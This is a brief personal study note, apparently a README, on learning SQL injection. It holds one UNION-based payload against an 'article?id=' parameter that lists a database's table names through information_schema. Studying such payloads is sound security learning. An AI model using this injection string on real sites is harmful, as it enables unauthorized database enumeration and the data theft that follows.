# Learning SQL Injection

Just taking some notes about different SQL Injections.

---------------------------------------------

#### * This will display the tables
```
	- article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()--
```